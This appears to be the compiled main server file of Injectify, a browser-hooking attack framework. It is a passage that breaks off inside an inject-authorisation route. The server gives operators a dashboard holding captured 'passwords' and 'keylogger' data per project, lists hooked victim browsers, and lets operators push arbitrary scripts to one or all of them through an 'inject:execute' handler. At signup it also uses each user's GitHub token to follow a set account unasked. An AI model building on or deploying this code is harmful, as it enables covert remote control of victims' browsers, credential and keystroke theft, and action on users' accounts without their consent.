"use strict";
exports.__esModule = true;
var MongoClient = require('mongodb').MongoClient;
var fs = require('fs-extra');
var chalk = require('chalk');
var path = require('path');
var request = require('request');
var URL = require('url').URL;
var handler_1 = require("./api/handler");
var handler_2 = require("./inject/handler");
var atob = require('atob');
var btoa = require('btoa');
var reverse = require('reverse-string');
var cookieParser = require('cookie-parser');
var parseAgent = require('user-agent-parser');
var me = require('mongo-escape').escape;
var RateLimit = require('express-rate-limit');
var getIP_js_1 = require("./modules/getIP.js");
var pretty = require('express-prettify');
/**
 * Read configuration
 */
if (!fs.existsSync('./server.config.js')) {
    if (fs.existsSync('./server.config.example.js')) {
        fs.copySync('./server.config.example.js', './server.config.js');
    }
    else {
        console.error(chalk.redBright("Failed to start! " + chalk.magentaBright('./server.config.js') + " and " + chalk.magentaBright('./server.config.example.js') + " are missing"));
    }
}
var config = global.config = require('../server.config.js').injectify;
var express = require('express');
var app = express();
var server = app.listen(config.express);
var io = require('socket.io').listen(server);
var apiLimiter = new RateLimit(config.rateLimiting.api);
var injectLimiter = new RateLimit(config.rateLimiting.inject.auth);
console.log(chalk.greenBright('[Injectify] ') + 'listening on port ' + config.express);
process.on('unhandledRejection', function (reason, p) {
    console.log(chalk.redBright('[Promise] ') + ' Unhandled Rejection at:', p, chalk.redBright('\nREASON:'), reason);
});
MongoClient.connect(config.mongodb, function (err, client) {
    if (err)
        throw err;
    var db = global.db = client.db('injectify');
    var api = new handler_1["default"](db);
    var Inject = new handler_2["default"](server, db);
    var inject = global.inject = Inject.state;
    io.on('connection', function (socket) {
        var globalToken;
        var state = {
            previous: '',
            page: '',
            refresh: null
        };
        var watchers = {
            inject: null,
            client: null
        };
        var getToken = function (code) {
            return new Promise(function (resolve, reject) {
                if (!code) {
                    reject(Error('Failed to authenticate account, null code'));
                }
                else {
                    request({
                        url: 'https://github.com/login/oauth/access_token',
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json'
                        },
                        qs: {
                            'client_id': config.github.client_id,
                            'client_secret': config.github.client_secret,
                            'code': code
                        }
                    }, function (error, response, github) {
                        try {
                            github = JSON.parse(github);
                        }
                        catch (e) {
                            console.log(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve token '), github);
                            console.error(e);
                            reject(Error('Failed to parse GitHub response'));
                        }
                        if (!error && response.statusCode === 200 && github.access_token) {
                            resolve(github.access_token);
                        }
                        else {
                            reject(Error('Failed to authenticate account, invalid code => ' + code));
                        }
                    });
                }
            });
        };
        var getUser = function (token) {
            return new Promise(function (resolve, reject) {
                request({
                    url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                        'User-Agent': 'Injectify'
                    }
                }, function (error, response, user) {
                    if (error) {
                        console.error(error);
                        return;
                    }
                    try {
                        user = JSON.parse(user);
                    }
                    catch (e) {
                        console.error(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '));
                        reject({
                            title: 'Could not authenticate you',
                            message: 'Failed to parse the GitHub user API response'
                        });
                    }
                    if (!error && response.statusCode === 200 && user.login) {
                        resolve(user);
                    }
                    else {
                        reject({
                            title: 'Could not authenticate you',
                            message: 'GitHub API rejected token!',
                            token: token
                        });
                    }
                });
            });
        };
        var database = function (user) {
            return new Promise(function (resolve, reject) {
                db.collection('users', function (err, users) {
                    if (err)
                        throw err;
                    users.findOne({
                        id: user.id
                    }).then(function (doc) {
                        resolve(doc);
                    });
                });
            });
        };
        var login = function (user, token, loginMethod) {
            return new Promise(function (resolve, reject) {
                db.collection('users', function (err, users) {
                    if (err)
                        throw err;
                    users.findOne({
                        id: user.id
                    }).then(function (doc) {
                        var ipAddress = getIP_js_1["default"](socket.handshake.address);
                        if (socket.handshake.headers['x-forwarded-for'])
                            ipAddress = getIP_js_1["default"](socket.handshake.headers['x-forwarded-for'].split(',')[0]);
                        if (doc !== null) {
                            // User exists in database
                            users.updateOne({
                                id: user.id
                            }, {
                                $set: {
                                    username: user.login,
                                    github: user // Update the GitHub object with latest values
                                },
                                $push: {
                                    logins: {
                                        timestamp: new Date(),
                                        ip: ipAddress,
                                        token: token,
                                        login_type: loginMethod
                                    }
                                }
                            }).then(function () {
                                resolve();
                            });
                        }
                        else {
                            // User doesn't exist in database
                            users.insertOne({
                                username: user.login,
                                id: user.id,
                                payment: {
                                    account_type: 'free',
                                    method: 'none'
                                },
                                github: user,
                                logins: [{
                                        timestamp: new Date(),
                                        ip: ipAddress,
                                        token: token,
                                        login_type: loginMethod
                                    }]
                            }, function (err, res) {
                                if (err) {
                                    reject(Error(err));
                                    throw err;
                                }
                                else {
                                    console.log(chalk.greenBright('[database] ') +
                                        chalk.yellowBright('added user ') +
                                        chalk.magentaBright(user.id) +
                                        chalk.cyanBright(' (' + user.login + ')'));
                                    if (config.follow.enable) {
                                        request({
                                            url: "https://api.github.com/user/following/" + config.follow.username + "?access_token=" + encodeURIComponent(token),
                                            method: 'PUT',
                                            headers: {
                                                'User-Agent': 'Injectify'
                                            }
                                        }, function (error, response) {
                                            if (error)
                                                throw error;
                                            resolve();
                                        });
                                    }
                                }
                            });
                        }
                    });
                });
            });
        };
        var newProject = function (project, user) {
            return new Promise(function (resolve, reject) {
                database(user).then(function (dbUser) {
                    db.collection('projects', function (err, projects) {
                        if (err)
                            throw err;
                        projects.find({
                            $or: [{
                                    'permissions.owners': user.id
                                }]
                        }).count().then(function (count) {
                            var restriction = 3;
                            if (dbUser.payment.account_type.toLowerCase() === 'pro')
                                restriction = 35;
                            if (dbUser.payment.account_type.toLowerCase() === 'elite')
                                restriction = 350;
                            if (config.superusers.includes(dbUser.id))
                                restriction = 0;
                            if (restriction !== 0 && count >= restriction) {
                                reject({
                                    title: 'Upgrade account',
                                    message: 'Your ' + dbUser.payment.account_type.toLowerCase() + ' account is limited to ' + restriction + ' projects (using ' + count + ')',
                                    id: 'upgrade'
                                });
                                return;
                            }
                            projects.findOne({
                                name: project
                            }).then(function (doc) {
                                if (doc == null) {
                                    // Project doesn't exist in database
                                    projects.insertOne({
                                        name: project,
                                        permissions: {
                                            owners: [user.id],
                                            admins: [],
                                            readonly: []
                                        },
                                        config: {
                                            filter: {
                                                type: 'whitelist',
                                                domains: []
                                            },
                                            created_at: new Date()
                                        },
                                        inject: {
                                            autoexecute: ''
                                        },
                                        passwords: [],
                                        keylogger: []
                                    }, function (err, res) {
                                        if (err) {
                                            throw err;
                                        }
                                        else {
                                            console.log(chalk.greenBright('[database] ') +
                                                chalk.magentaBright(user.id) +
                                                chalk.cyanBright(' (' + user.login + ') ') +
                                                chalk.yellowBright('added project ') +
                                                chalk.magentaBright(project));
                                            resolve({
                                                title: 'Project created',
                                                message: "Created project '" + project + "', " + (+restriction - count) + ' slots remaining'
                                            });
                                        }
                                    });
                                }
                                else {
                                    // Project already exists
                                    console.log(chalk.redBright('[database] ') +
                                        chalk.yellowBright('project ') +
                                        chalk.magentaBright(project) +
                                        chalk.yellowBright(' already exists '));
                                    reject({
                                        title: 'Project name already taken',
                                        message: 'Please choose another name'
                                    });
                                }
                            });
                        })["catch"](function (error) {
                            reject({
                                title: 'Database error',
                                message: 'An internal error occured whilst handling your request'
                            });
                            throw error;
                        });
                    });
                })["catch"](function (error) {
                    reject({
                        title: 'Database error',
                        message: 'An internal error occured whilst handling your request'
                    });
                    throw error;
                });
            });
        };
        var getProjects = function (user) {
            return new Promise(function (resolve, reject) {
                db.collection('projects', function (err, projects) {
                    if (err)
                        throw err;
                    var projectsWithAccess = [];
                    projects.find({
                        $or: [{
                                'permissions.owners': user.id
                            },
                            {
                                'permissions.admins': user.id
                            },
                            {
                                'permissions.readonly': user.id
                            }
                        ]
                    }).sort({
                        name: 1
                    }).forEach(function (doc) {
                        if (doc !== null) {
                            projectsWithAccess.push({
                                name: doc.name,
                                permissions: doc.permissions
                            });
                        }
                    }, function (error) {
                        if (error)
                            throw error;
                        if (projectsWithAccess.length > 0) {
                            resolve(projectsWithAccess);
                        }
                        else {
                            reject('no projects saved for user ' + user.id);
                        }
                    });
                });
            });
        };
        var getProject = function (name, user) {
            return new Promise(function (resolve, reject) {
                db.collection('projects', function (err, projects) {
                    if (err)
                        throw err;
                    projects.findOne({
                        $or: [{
                                'permissions.owners': user.id
                            },
                            {
                                'permissions.admins': user.id
                            },
                            {
                                'permissions.readonly': user.id
                            }
                        ],
                        $and: [{
                                'name': name
                            }]
                    }).then(function (doc) {
                        if (doc !== null) {
                            var myPermissionLevel = 3;
                            if (doc.permissions.owners.includes(user.id)) {
                                myPermissionLevel = 1;
                            }
                            else if (doc.permissions.admins.includes(user.id)) {
                                myPermissionLevel = 2;
                            }
                            resolve({
                                doc: doc,
                                myPermissionLevel: myPermissionLevel
                            });
                        }
                        else {
                            reject({
                                title: 'Access denied',
                                message: "You don't have permission to access project " + name
                            });
                        }
                    });
                });
            });
        };
        var unwatch = function (type) {
            if (type === 'client' && watchers.client && inject.clients[watchers.client.id][watchers.client.token] && inject.clients[watchers.client.id][watchers.client.token].watchers)
                inject.clients[watchers.client.id][watchers.client.token].watchers.forEach(function (watcher, i) {
                    if (watcher.socket === socket.id) {
                        inject.clients[watchers.client.id][watchers.client.token].watchers.splice(i, 1);
                    }
                });
            if (type === 'inject' && watchers.inject)
                inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(function (watcher) {
                    return watcher.id !== socket.id;
                });
        };
        /**
         * Send server info to client
         */
        socket.emit('server:info', {
            github: {
                client_id: config.github.client_id,
                scope: config.github.scope
            },
            discord: config.discord && config.discord.widgetbot
        });
        socket.on('auth:github', function (data) {
            if (data.code) {
                // Convert the code into a user-token
                getToken(data.code).then(function (token) {
                    if (config.debug) {
                        console.log(chalk.greenBright('[GitHub] ') +
                            chalk.yellowBright('retrieved token ') +
                            chalk.magentaBright(token));
                    }
                    // Convert the token into a user object
                    getUser(token).then(function (user) {
                        globalToken = token;
                        socket.emit('auth:github', {
                            success: true,
                            token: token,
                            user: user
                        });
                        if (config.debug) {
                            console.log(chalk.greenBright('[GitHub] ') +
                                chalk.yellowBright('authenticated user ') +
                                chalk.magentaBright(user.id) +
                                chalk.cyanBright(' (' + user.login + ')'));
                        }
                        // Add the user to the database if they don't exist
                        login(user, token, 'manual').then(function () {
                            getProjects(user).then(function (projects) {
                                socket.emit('user:projects', projects);
                            })["catch"](function (error) {
                                if (config.debug)
                                    console.log(chalk.redBright('[database] '), error);
                            });
                        })["catch"](function (error) {
                            console.log(chalk.redBright('[database] '), error);
                            socket.emit('database:registration', {
                                success: false,
                                message: error
                            });
                        });
                    })["catch"](function (error) {
                        console.log(chalk.redBright('[auth:github] '), error.message);
                        socket.emit('err', {
                            title: error.title,
                            message: error.message
                        });
                    });
                })["catch"](function (error) {
                    console.log(chalk.redBright('[auth:github] '), error.message);
                    socket.emit('err', {
                        title: error.title,
                        message: error.message
                    });
                });
            }
        });
        socket.on('auth:signout', function (data) {
            globalToken = '';
            state = {};
            if (watchers.inject) {
                inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(function (watcher) {
                    return watcher.id !== socket.id;
                });
            }
        });
        socket.on('auth:github/token', function (token) {
            if (token) {
                // Convert the token into a user object
                getUser(token).then(function (user) {
                    globalToken = token;
                    socket.emit('auth:github', {
                        success: true,
                        token: token,
                        user: user
                    });
                    if (config.debug) {
                        console.log(chalk.greenBright('[GitHub] ') +
                            chalk.yellowBright('authenticated user ') +
                            chalk.magentaBright(user.id) +
                            chalk.cyanBright(' (' + user.login + ')'));
                    }
                    // Add the user to the database if they don't exist
                    login(user, token, 'automatic').then(function () {
                        getProjects(user).then(function (projects) {
                            socket.emit('user:projects', projects);
                        })["catch"](function (error) {
                            if (config.debug)
                                console.log(chalk.redBright('[database] '), error);
                        });
                    })["catch"](function (error) {
                        console.log(chalk.redBright('[database] '), error);
                        socket.emit('database:registration', {
                            success: false,
                            message: error.toString()
                        });
                    });
                })["catch"](function (error) {
                    // Signal the user to re-authenticate their GitHub account
                    console.log(chalk.redBright('[auth:github/token] '), error.message);
                    socket.emit('auth:github/stale', {
                        title: error.title.toString(),
                        message: error.message.toString()
                    });
                });
            }
        });
        socket.on('github:star', function (action) {
            if (globalToken) {
                if (action === 'star' || action === 'unstar') {
                    request({
                        url: "https://api.github.com/user/starred/samdenty99/injectify?access_token=" + encodeURIComponent(globalToken),
                        method: action === 'star' ? 'PUT' : 'DELETE',
                        headers: {
                            'User-Agent': 'Injectify'
                        }
                    }, function (error, response) {
                        if (error)
                            throw error;
                    });
                }
            }
            else {
                socket.emit('err', {
                    title: 'Failed',
                    message: 'You need to sign in with GitHub first'
                });
            }
        });
        socket.on('project:create', function (project) {
            if (project.name && globalToken) {
                if (project.name.length > 50) {
                    socket.emit('err', {
                        title: 'Failed to create project',
                        message: 'Project name must be under 50 characters'
                    });
                    return;
                }
                getUser(globalToken).then(function (user) {
                    newProject(project.name, user).then(function (data) {
                        socket.emit('notify', {
                            title: data.title,
                            message: data.message,
                            id: data.id
                        });
                        getProjects(user).then(function (projects) {
                            socket.emit('user:projects', projects);
                        })["catch"](function (error) {
                            if (config.debug)
                                console.log(chalk.redBright('[database] '), error);
                        });
                    })["catch"](function (e) {
                        socket.emit('err', {
                            title: e.title,
                            message: e.message,
                            id: e.id
                        });
                    });
                })["catch"](function (error) {
                    // Failed to authenticate user with token
                    console.log(chalk.redBright('[project:create] '), error.message);
                    socket.emit('err', {
                        title: error.title.toString(),
                        message: error.message.toString(),
                        id: error.id
                    });
                });
            }
            else {
                socket.emit('err', {
                    title: 'Access denied',
                    message: 'You need to be authenticated first!'
                });
            }
        });
        socket.on('project:read', function (data) {
            var project = data.project, page = data.page;
            var pages = ['overview', 'passwords', 'keylogger', 'inject', 'config'];
            if (globalToken) {
                if (project && page && pages.includes(page)) {
                    state.page = page;
                    state.project = project;
                    clearTimeout(state.refresh);
                    getUser(globalToken).then(function (user) {
                        /**
                         * Fetch the user from the database
                         */
                        database(user).then(function (dbUser) {
                            (function check() {
                                /**
                                 * Make sure they are still on the same page and same project
                                 */
                                if (state.page !== page || state.project !== project)
                                    return;
                                /**
                                 * Fetch the project from the database
                                 */
                                getProject(project, user).then(function (doc) {
                                    doc = doc.doc;
                                    /**
                                     * Iterates over the pages array and removes elements
                                     * from the doc that don't match the requested page
                                     */
                                    for (var _i = 0, pages_1 = pages; _i < pages_1.length; _i++) {
                                        var p = pages_1[_i];
                                        if (p !== page) {
                                            delete doc[p];
                                        }
                                    }
                                    var currentState = JSON.stringify(doc);
                                    if (state.previous !== currentState) {
                                        state.previous = currentState;
                                        socket.emit('project:read', {
                                            page: page,
                                            doc: doc
                                        });
                                    }
                                    /**
                                     * Check
                                     */
                                    state.refresh = setTimeout(check, 1000);
                                })["catch"](function (e) {
                                    // User doesn't have permission access the project
                                    socket.emit('err', {
                                        title: e.title,
                                        message: e.message
                                    });
                                });
                            })();
                        });
                    })["catch"](function (error) {
                        // Failed to authenticate user with token
                        console.log(chalk.redBright('[project:read] '), error.message);
                        socket.emit('err', {
                            title: error.title.toString(),
                            message: error.message.toString()
                        });
                    });
                }
                else {
                    socket.emit('err', {
                        title: 'Invalid request',
                        message: 'Project collection type does not exist'
                    });
                }
            }
            else {
                socket.emit('err', {
                    title: 'Access denied',
                    message: 'You need to be authenticated first!'
                });
            }
        });
        socket.on('project:modify', function (data) {
            var command = data.command;
            var project = data.project;
            var convertToID = function (type, value) {
                return new Promise(function (resolve, reject) {
                    if (type === 'id') {
                        request({
                            url: 'https://api.github.com/user/' + encodeURIComponent(value) + '?client_id=' + config.github.client_id + '&client_secret=' + config.github.client_secret,
                            method: 'GET',
                            headers: {
                                'Accept': 'application/json',
                                'User-Agent': 'Injectify'
                            }
                        }, function (error, response, user) {
                            try {
                                user = JSON.parse(user);
                            }
                            catch (e) {
                                console.log(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '), user);
                                console.error(e);
                                reject({
                                    title: 'Internal server error',
                                    message: 'Failed to parse the GitHub user API response'
                                });
                            }
                            if (!error && response.statusCode === 200 && user.id) {
                                resolve(user);
                            }
                            else {
                                console.log(error, response.statusCode, user.id);
                                reject({
                                    title: 'User does not exist',
                                    message: 'The specified user does not exist'
                                });
                            }
                        });
                    }
                    else {
                        request({
                            url: 'https://api.github.com/users/' + encodeURIComponent(value) + '?client_id=' + config.github.client_id + '&client_secret=' + config.github.client_secret,
                            method: 'GET',
                            headers: {
                                'Accept': 'application/json',
                                'User-Agent': 'Injectify'
                            }
                        }, function (error, response, user) {
                            try {
                                user = JSON.parse(user);
                            }
                            catch (e) {
                                console.log(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '), user);
                                console.error(e);
                                reject({
                                    title: 'Internal server error',
                                    message: 'Failed to parse the GitHub user API response'
                                });
                            }
                            if (!error && response.statusCode === 200 && user.id) {
                                resolve(user);
                            }
                            else {
                                console.log(error, response.statusCode, user.id);
                                reject({
                                    title: 'User does not exist',
                                    message: 'The specified user does not exist'
                                });
                            }
                        });
                    }
                });
            };
            var addToProject = function (requestingUser, targetUser, choosenPermissionLevel, targetProject) {
                return new Promise(function (resolve, reject) {
                    if (targetProject.doc.permissions.owners.includes(targetUser) || targetProject.doc.permissions.admins.includes(targetUser) || targetProject.doc.permissions.readonly.includes(targetUser)) {
                        reject({
                            title: 'User already exists',
                            message: 'The selected user already exists in this project'
                        });
                    }
                    else {
                        if (choosenPermissionLevel === 'owners') {
                            if (!targetProject.doc.permissions.owners.includes(requestingUser.id)) {
                                reject({
                                    title: 'Insufficient permissions',
                                    message: "You don't have permission to add user"
                                });
                                return;
                            }
                        }
                        else if (choosenPermissionLevel === 'admins') {
                            if (!targetProject.doc.permissions.owners.includes(requestingUser.id)) {
                                reject({
                                    title: 'Insufficient permissions',
                                    message: "You don't have permission to add user"
                                });
                                return;
                            }
                        }
                        else if (choosenPermissionLevel === 'readonly') {
                            if (!targetProject.doc.permissions.owners.includes(requestingUser.id) && !targetProject.doc.permissions.admins.includes(requestingUser.id)) {
                                reject({
                                    title: 'Insufficient permissions',
                                    message: "You don't have permission to add user"
                                });
                                return;
                            }
                        }
                        else {
                            reject({
                                title: 'Failed to add user',
                                message: 'Invalid permission type selected'
                            });
                            return;
                        }
                        db.collection('projects', function (err, projects) {
                            if (err)
                                throw err;
                            projects.updateOne({
                                name: targetProject.doc.name
                            }, {
                                $push: (_a = {},
                                    _a['permissions.' + choosenPermissionLevel] = targetUser,
                                    _a)
                            });
                            var _a;
                        });
                        resolve({
                            title: 'Added user to project',
                            message: 'Successfully added user to project'
                        });
                    }
                });
            };
            var removeFromProject = function (requestingUser, targetUser, targetProject) {
                return new Promise(function (resolve, reject) {
                    var theirPermissionLevel, theirPermissionName;
                    if (targetProject.doc.permissions.owners.includes(targetUser)) {
                        theirPermissionLevel = 1;
                        theirPermissionName = 'permissions.owners';
                    }
                    else if (targetProject.doc.permissions.admins.includes(targetUser)) {
                        theirPermissionLevel = 2;
                        theirPermissionName = 'permissions.admins';
                    }
                    else if (targetProject.doc.permissions.readonly.includes(targetUser)) {
                        theirPermissionLevel = 3;
                        theirPermissionName = 'permissions.readonly';
                    }
                    if (targetProject.myPermissionLevel !== 3 && targetProject.myPermissionLevel <= theirPermissionLevel) {
                        db.collection('projects', function (err, projects) {
                            if (err)
                                throw err;
                            projects.updateOne({
                                name: targetProject.doc.name
                            }, {
                                $pull: (_a = {},
                                    _a[theirPermissionName] = targetUser,
                                    _a)
                            });
                            var _a;
                        });
                        resolve({
                            title: 'Removed user',
                            message: 'Successfully removed user from project'
                        });
                    }
                    else {
                        reject({
                            title: 'Insufficient permissions',
                            message: "You don't have permission to remove user"
                        });
                    }
                });
            };
            var renameProject = function (requestingUser, targetProject, newName) {
                return new Promise(function (resolve, reject) {
                    if (targetProject.doc.permissions.owners.includes(requestingUser.id)) {
                        db.collection('projects', function (err, projects) {
                            if (err)
                                throw err;
                            projects.findOne({
                                name: newName
                            }).then(function (doc) {
                                if (doc == null) {
                                    projects.updateOne({
                                        name: targetProject.doc.name
                                    }, {
                                        $set: {
                                            name: newName
                                        }
                                    });
                                    resolve({
                                        title: 'Renamed project',
                                        message: 'Successfully renamed project to ' + newName
                                    });
                                }
                                else {
                                    reject({
                                        title: 'Failed to rename project',
                                        message: 'The selected name ' + newName + ' is already taken'
                                    });
                                }
                            });
                        });
                    }
                    else {
                        reject({
                            title: 'Insufficient permissions',
                            message: 'You need to be an owner to rename this project'
                        });
                    }
                });
            };
            var updateFilters = function (requestingUser, targetProject, newFilters) {
                return new Promise(function (resolve, reject) {
                    if (targetProject.doc.permissions.owners.includes(requestingUser.id) || targetProject.doc.permissions.admins.includes(requestingUser.id)) {
                        db.collection('projects', function (err, projects) {
                            if (err)
                                throw err;
                            projects.findOne({
                                name: targetProject.doc.name
                            }).then(function (doc) {
                                if (doc !== null) {
                                    projects.updateOne({
                                        name: targetProject.doc.name
                                    }, {
                                        $set: {
                                            'config.filter': newFilters
                                        }
                                    });
                                    resolve({
                                        title: 'Updated domain filters',
                                        message: 'Successfully updated filters for ' + targetProject.doc.name
                                    });
                                }
                                else {
                                    reject({
                                        title: 'Failed to update filters',
                                        message: "Project doesn't exist"
                                    });
                                }
                            });
                        });
                    }
                    else {
                        reject({
                            title: 'Insufficient permissions',
                            message: "You don't have permission to modify filters for this project"
                        });
                    }
                });
            };
            if (command && project) {
                getUser(globalToken).then(function (user) {
                    getProject(project, user).then(function (thisProject) {
                        if (command === 'permissions:add') {
                            if (data.project && data.method && data.type && data.value) {
                                convertToID(data.method, data.value).then(function (targetUser) {
                                    addToProject(user, targetUser.id, data.type, thisProject).then(function (r) {
                                        socket.emit('notify', {
                                            title: r.title,
                                            message: r.message
                                        });
                                        console.log(chalk.greenBright('[database] ') +
                                            chalk.magentaBright(user.id) +
                                            chalk.cyanBright(' (' + user.login + ') ') +
                                            chalk.yellowBright('added user ') +
                                            chalk.magentaBright(targetUser.id) +
                                            chalk.cyanBright(' (' + targetUser.login + ') ') +
                                            chalk.yellowBright(' to project ') +
                                            chalk.magentaBright(thisProject.doc.name));
                                    })["catch"](function (e) {
                                        socket.emit('err', {
                                            title: e.title,
                                            message: e.message
                                        });
                                    });
                                })["catch"](function (e) {
                                    socket.emit('err', {
                                        title: e.title,
                                        message: e.message
                                    });
                                });
                            }
                            else {
                                socket.emit('err', {
                                    title: 'Failed to add user',
                                    message: 'Invalid request sent'
                                });
                            }
                        }
                        if (command === 'permissions:remove') {
                            if (data.user) {
                                removeFromProject(user, data.user, thisProject).then(function (response) {
                                    socket.emit('notify', response);
                                    console.log(chalk.greenBright('[database] ') +
                                        chalk.magentaBright(user.id) +
                                        chalk.cyanBright(' (' + user.login + ') ') +
                                        chalk.yellowBright('removed user ') +
                                        chalk.magentaBright(data.user) +
                                        chalk.yellowBright(' from project ') +
                                        chalk.magentaBright(thisProject.doc.name));
                                })["catch"](function (e) {
                                    socket.emit('err', {
                                        title: e.title,
                                        message: e.message
                                    });
                                });
                            }
                            else {
                                socket.emit('err', {
                                    title: 'Invalid request',
                                    message: 'Failed to remove user from project'
                                });
                            }
                        }
                        if (command === 'project:rename') {
                            if (data.newName) {
                                if (data.newName.length > 50) {
                                    socket.emit('err', {
                                        title: 'Failed to rename project',
                                        message: 'Project name must be under 50 characters'
                                    });
                                    return;
                                }
                                if (data.newName === thisProject.doc.name)
                                    return;
                                renameProject(user, thisProject, data.newName).then(function (response) {
                                    state.project = '';
                                    state.page = '';
                                    clearTimeout(state.refresh);
                                    socket.emit('project:switch', {
                                        project: data.newName
                                    });
                                    setTimeout(function () {
                                        getProjects(user).then(function (projects) {
                                            socket.emit('user:projects', projects);
                                        })["catch"](function (error) {
                                            if (config.debug)
                                                console.log(chalk.redBright('[database] '), error);
                                        });
                                        socket.emit('notify', response);
                                    }, 10);
                                    console.log(chalk.greenBright('[database] ') +
                                        chalk.magentaBright(user.id) +
                                        chalk.cyanBright(' (' + user.login + ') ') +
                                        chalk.yellowBright('renamed project from ') +
                                        chalk.magentaBright(thisProject.doc.name) +
                                        chalk.yellowBright(' to ') +
                                        chalk.magentaBright(data.newName));
                                })["catch"](function (e) {
                                    socket.emit('err', {
                                        title: e.title,
                                        message: e.message
                                    });
                                });
                            }
                            else {
                                socket.emit('err', {
                                    title: 'Invalid request',
                                    message: 'New project name not specified'
                                });
                            }
                        }
                        if (command === 'filters:modify') {
                            if (data.project && data.filter) {
                                updateFilters(user, thisProject, data.filter).then(function (response) {
                                    socket.emit('notify', {
                                        title: response.title,
                                        message: response.message
                                    });
                                })["catch"](function (e) {
                                    socket.emit('err', {
                                        title: e.title,
                                        message: e.message
                                    });
                                });
                            }
                            else {
                                socket.emit('err', {
                                    title: 'Invalid request',
                                    message: 'Failed to update filters'
                                });
                            }
                        }
                    })["catch"](function (e) {
                        socket.emit('err', {
                            title: e.title,
                            message: e.message
                        });
                    });
                })["catch"](function (e) {
                    socket.emit('err', {
                        title: e.title,
                        message: e.message
                    });
                });
            }
        });
        socket.on('inject:clients', function (data) {
            var project = data.project;
            if (project && globalToken) {
                getUser(globalToken).then(function (user) {
                    getProject(project, user).then(function (thisProject) {
                        if (watchers.inject) {
                            inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(function (watcher) {
                                return watcher.id !== socket.id;
                            });
                        }
                        watchers.inject = thisProject.doc['_id'];
                        if (!inject.watchers[watchers.inject])
                            inject.watchers[watchers.inject] = [];
                        inject.watchers[watchers.inject].push({
                            id: socket.id,
                            callback: function (event, session) {
                                socket.emit('inject:clients', {
                                    event: event,
                                    session: session,
                                    project: project
                                });
                            }
                        });
                        socket.emit('inject:clients', {
                            event: 'list',
                            clients: inject.clients[thisProject.doc['_id']],
                            project: project
                        });
                    })["catch"](function (e) {
                        console.log(e);
                        socket.emit('err', {
                            title: e.title,
                            message: e.message
                        });
                    });
                })["catch"](function (error) {
                    // Failed to authenticate user with token
                    console.log(chalk.redBright('[inject:clients] '), error.message);
                    socket.emit('err', {
                        title: error.title.toString(),
                        message: error.message.toString()
                    });
                });
            }
            else {
                socket.emit('err', {
                    title: 'Access denied',
                    message: 'You need to be authenticated first!'
                });
            }
        });
        socket.on('inject:client', function (data) {
            var project = data.project, client = data.client;
            if (typeof project === 'string' && typeof client === 'string' && globalToken) {
                getUser(globalToken).then(function (user) {
                    getProject(project, user).then(function (thisProject) {
                        var clients = inject.clients[thisProject.doc['_id']];
                        /**
                         * Remove previous watchers
                         */
                        unwatch('client');
                        if (clients && clients[client]) {
                            var watchingClient = clients[client];
                            if (!watchingClient.watchers)
                                watchingClient.watchers = [];
                            watchingClient.watchers.push({
                                socket: socket.id,
                                emit: function (client) {
                                    socket.emit('inject:client', client);
                                }
                            });
                            inject.clients[thisProject.doc['_id']][client] = watchingClient;
                            /**
                             * Overwrite watchers object
                             */
                            watchers.client = {
                                id: thisProject.doc['_id'],
                                token: client
                            };
                        }
                    })["catch"](function (e) {
                        console.log(e);
                        socket.emit('err', {
                            title: e.title,
                            message: e.message
                        });
                    });
                })["catch"](function (error) {
                    // Failed to authenticate user with token
                    console.log(chalk.redBright('[inject:client] '), error.message);
                    socket.emit('err', {
                        title: error.title.toString(),
                        message: error.message.toString()
                    });
                });
            }
            else {
                socket.emit('err', {
                    title: 'Access denied',
                    message: 'You need to be authenticated first!'
                });
            }
        });
        socket.on('inject:execute', function (data) {
            var project = data.project, token = data.token, id = data.id, script = data.script, recursive = data.recursive;
            if (project && (recursive || (typeof token === 'string' && typeof id === 'number')) && typeof script === 'string' && globalToken) {
                getUser(globalToken).then(function (user) {
                    getProject(project, user).then(function (thisProject) {
                        if (recursive) {
                            Object.keys(inject.clients[thisProject.doc['_id']]).forEach(function (token) {
                                if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                                    inject.clients[thisProject.doc['_id']][token].sessions.forEach(function (client) {
                                        client.execute(script);
                                    });
                                }
                            });
                        }
                        else {
                            if (inject.clients[thisProject.doc['_id']] && inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                                var client_1 = inject.clients[thisProject.doc['_id']][token].sessions.find(function (c) { return c.id === id; });
                                if (client_1) {
                                    client_1.execute(script);
                                }
                                else {
                                    socket.emit('err', {
                                        title: 'Failed to execute!',
                                        message: 'Could not locate client'
                                    });
                                }
                            }
                            else {
                                socket.emit('err', {
                                    title: 'Failed to execute!',
                                    message: 'Could not locate client'
                                });
                            }
                        }
                    })["catch"](function (e) {
                        console.log(e);
                        socket.emit('err', {
                            title: e.title,
                            message: e.message
                        });
                    });
                })["catch"](function (error) {
                    // Failed to authenticate user with token
                    console.log(chalk.redBright('[inject:execute] '), error.message);
                    socket.emit('err', {
                        title: error.title.toString(),
                        message: error.message.toString()
                    });
                });
            }
            else {
                socket.emit('err', {
                    title: 'Failed to execute!',
                    message: 'Invalid request'
                });
            }
        });
        socket.on('project:close', function (data) {
            state.project = '';
            state.page = '';
            clearTimeout(state.refresh);
            unwatch('client');
        });
        socket.on('inject:close', function (data) {
            unwatch('inject');
            unwatch('client');
        });
        socket.on('disconnect', function (data) {
            unwatch('inject');
            unwatch('client');
            state = {};
        });
    });
    /**
     * Enable the cookie parser
     */
    app.use(cookieParser());
    /**
     * Enable the pretty printer with the pretty param
     */
    app.use(pretty({ query: 'pretty' }));
    /**
     * Inject authorisation API
     */
    app.get('/a', injectLimiter, function (req, res) {
        var generateToken = function (req) {
            var ip;
            try {
                ip = req.headers['x-forwarded-for'].split(',')[0];
            }
            catch (e) {
                ip = getIP_js_1["default"](req.connection.remoteAddress);
            }
            return btoa(JSON.stringify({
                ip: ip,
                id: +new Date()
            }));
        };
        var authenticate = function (req, res, token) {
            var id = req.query.id;
